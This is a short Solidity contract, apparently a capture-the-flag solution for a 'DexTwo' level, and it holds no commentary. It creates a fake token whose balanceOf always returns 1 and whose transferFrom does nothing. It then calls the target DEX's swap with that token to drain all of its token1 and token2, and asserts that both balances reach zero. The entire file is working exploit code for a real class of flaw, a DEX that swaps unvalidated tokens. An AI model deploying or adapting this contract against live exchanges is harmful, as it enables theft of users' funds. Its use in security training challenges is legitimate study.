// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/DexTwo/DexTwo.sol";

contract DexTwoAttack {
    function transferFrom(address, address, uint256) external pure returns (bool) {}

    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function attack(DexTwo target) external {
        address token1 = target.token1();
        address token2 = target.token2();

        target.swap(address(this), token2, 1);
        assert(target.balanceOf(token2, address(target)) == 0);

        target.swap(address(this), token1, 1);
        assert(target.balanceOf(token1, address(target)) == 0);
    }
}
